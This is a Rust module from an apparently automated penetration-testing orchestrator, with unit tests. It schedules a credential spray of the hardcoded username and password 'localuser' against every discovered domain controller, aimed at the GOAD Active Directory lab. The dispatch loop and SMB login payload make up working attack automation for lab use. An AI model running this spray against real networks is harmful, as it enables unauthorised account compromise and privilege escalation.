//! auto_localuser_spray -- test localuser/localuser credentials across domains.
//!
//! GOAD configures a `localuser` account with username=password across all three
//! domains. In one domain this user has Domain Admin privileges. This module
//! specifically tests the localuser:localuser credential combo against each
//! discovered DC, which standard password spraying may miss if it doesn't
//! include "localuser" in its wordlist.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Collect localuser spray work items from current state.
///
/// Pure logic extracted from `auto_localuser_spray` so it can be unit-tested
/// without needing a `Dispatcher` or async runtime.
fn collect_localuser_spray_work(state: &StateInner) -> Vec<LocaluserWork> {
    let mut items = Vec::new();

    for (domain, dc_ip) in &state.all_domains_with_dcs() {
        let dedup_key = format!("localuser:{}", domain.to_lowercase());
        if state.is_processed(DEDUP_LOCALUSER_SPRAY, &dedup_key) {
            continue;
        }

        items.push(LocaluserWork {
            dedup_key,
            domain: domain.clone(),
            dc_ip: dc_ip.clone(),
        });
    }

    items
}

/// Tests localuser:localuser credentials against each domain.
/// Interval: 45s.
pub async fn auto_localuser_spray(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("localuser_spray") {
            continue;
        }

        let work = {
            let state = dispatcher.state.read().await;
            collect_localuser_spray_work(&state)
        };

        for item in work {
            let payload = json!({
                "technique": "smb_login_check",
                "target_ip": item.dc_ip,
                "domain": item.domain,
                "credential": {
                    "username": "localuser",
                    "password": "localuser",
                    "domain": item.domain,
                },
            });

            let priority = dispatcher.effective_priority("localuser_spray");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %item.domain,
                        dc = %item.dc_ip,
                        "localuser credential spray dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_LOCALUSER_SPRAY, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_LOCALUSER_SPRAY, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(domain = %item.domain, "localuser spray deferred");
                }
                Err(e) => {
                    warn!(err = %e, domain = %item.domain, "Failed to dispatch localuser spray");
                }
            }
        }
    }
}

struct LocaluserWork {
    dedup_key: String,
    domain: String,
    dc_ip: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- collect_localuser_spray_work tests ---

    #[test]
    fn collect_empty_state_returns_no_work() {
        let state = StateInner::new("test-op".into());
        let work = collect_localuser_spray_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_single_domain_produces_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = collect_localuser_spray_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].domain, "contoso.local");
        assert_eq!(work[0].dc_ip, "192.168.58.10");
        assert_eq!(work[0].dedup_key, "localuser:contoso.local");
    }

    #[test]
    fn collect_multiple_domains() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state
            .domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.20".into());
        let work = collect_localuser_spray_work(&state);
        assert_eq!(work.len(), 2);
        let domains: Vec<&str> = work.iter().map(|w| w.domain.as_str()).collect();
        assert!(domains.contains(&"contoso.local"));
        assert!(domains.contains(&"fabrikam.local"));
    }

    #[test]
    fn collect_dedup_skips_already_processed() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state.mark_processed(DEDUP_LOCALUSER_SPRAY, "localuser:contoso.local".into());
        let work = collect_localuser_spray_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_dedup_skips_processed_keeps_unprocessed() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        state
            .domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.20".into());
        state.mark_processed(DEDUP_LOCALUSER_SPRAY, "localuser:contoso.local".into());
        let work = collect_localuser_spray_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].domain, "fabrikam.local");
    }

    #[test]
    fn collect_dedup_key_lowercased() {
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("CONTOSO.LOCAL".into(), "192.168.58.10".into());
        let work = collect_localuser_spray_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].dedup_key, "localuser:contoso.local");
    }

    #[test]
    fn collect_no_credentials_needed() {
        // localuser_spray does NOT require existing credentials (it uses hardcoded localuser:localuser)
        let mut state = StateInner::new("test-op".into());
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(state.credentials.is_empty());
        let work = collect_localuser_spray_work(&state);
        assert_eq!(work.len(), 1);
    }

    #[test]
    fn dedup_key_format() {
        let key = format!("localuser:{}", "contoso.local");
        assert_eq!(key, "localuser:contoso.local");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_LOCALUSER_SPRAY, "localuser_spray");
    }

    #[test]
    fn payload_structure_has_correct_technique() {
        let payload = json!({
            "technique": "smb_login_check",
            "target_ip": "192.168.58.10",
            "domain": "contoso.local",
            "credential": {
                "username": "localuser",
                "password": "localuser",
                "domain": "contoso.local",
            },
        });
        assert_eq!(payload["technique"], "smb_login_check");
        assert_eq!(payload["target_ip"], "192.168.58.10");
        assert_eq!(payload["credential"]["username"], "localuser");
        assert_eq!(payload["credential"]["password"], "localuser");
        assert_eq!(payload["credential"]["domain"], "contoso.local");
    }

    #[test]
    fn work_struct_construction() {
        let work = LocaluserWork {
            dedup_key: "localuser:contoso.local".into(),
            domain: "contoso.local".into(),
            dc_ip: "192.168.58.10".into(),
        };
        assert_eq!(work.domain, "contoso.local");
        assert_eq!(work.dc_ip, "192.168.58.10");
        assert_eq!(work.dedup_key, "localuser:contoso.local");
    }

    #[test]
    fn no_credentials_needed_in_work_struct() {
        // LocaluserWork does not carry a credential -- it uses hardcoded localuser:localuser
        let work = LocaluserWork {
            dedup_key: "localuser:fabrikam.local".into(),
            domain: "fabrikam.local".into(),
            dc_ip: "192.168.58.20".into(),
        };
        assert_eq!(work.domain, "fabrikam.local");
    }

    #[test]
    fn dedup_key_normalizes_domain() {
        let key = format!("localuser:{}", "CONTOSO.LOCAL".to_lowercase());
        assert_eq!(key, "localuser:contoso.local");
    }

    #[test]
    fn credential_uses_domain_from_target() {
        let domain = "contoso.local";
        let payload = json!({
            "credential": {
                "username": "localuser",
                "password": "localuser",
                "domain": domain,
            },
        });
        assert_eq!(payload["credential"]["domain"], domain);
    }

    #[test]
    fn per_domain_dedup() {
        let domains = ["contoso.local", "fabrikam.local"];
        let keys: Vec<String> = domains
            .iter()
            .map(|d| format!("localuser:{}", d.to_lowercase()))
            .collect();
        assert_eq!(keys.len(), 2);
        assert_ne!(keys[0], keys[1]);
    }
}
